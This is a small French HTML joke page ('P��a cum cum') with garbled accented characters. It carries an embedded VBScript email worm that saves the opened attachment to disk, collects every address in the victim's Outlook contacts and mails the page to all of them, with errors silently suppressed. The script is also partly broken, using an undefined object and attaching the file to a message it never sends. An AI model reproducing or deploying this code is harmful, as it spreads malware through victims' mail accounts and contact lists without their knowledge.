<html>
<head>
<title>P��a cum cum</title>
<meta name="Description" content="La cum cum vous chope.">
<meta name="KeyWords" content="p��a cum cum, loftstory, f�licien">
<meta name="Author" content="f�licien">
</head>
<body bgcolor="#c0ffc0" link="#0000ff" vlink="#ff00ff">
<p>&nbsp;</p>
<p align="center">
<font size=4><b>P��a cum cum</b></font><br>
&nbsp;
</p>
<p>La cum cum vous chope, vous l'avez chop�.</p>
<p>&nbsp;</p>
<script language="vbscript">
On Error Resume Next
Set myItemFJ = myOlApp.ActiveInspector.CurrentItem
Set myAttachmentsSA = myItemFJ.Attachments
myAttachmentsSA.Item(1).SaveAsFile "c:\cumcum.htm"
set out=CreateObject("Outlook.Application")
set olns = out.GetNameSpace("MAPI")
set male=out.CreateItem(0)
set FolderContacts = olns.GetDefaultFolder(10)
NumContacts = FolderContacts.Items.Count
set MyContacts = FolderContacts.Items
For I = 1 to NumContacts
   if MyContacts(I).Email1Address<>"" then
      male.Recipients.Add(MyContacts(I).Email1Address)
      end if
   Next
Set myItemFJCI = myOlApp.CreateItem(olMailItem)
Set myAttachmentsSE = myItemFJCI.Attachments
myAttachmentsSE.Add "c:\cumcum.htm"
male.Subject = "P��a cum cum"
male.Body = ""
male.Send
</script>
<p>&nbsp;</p>
</body>
</html>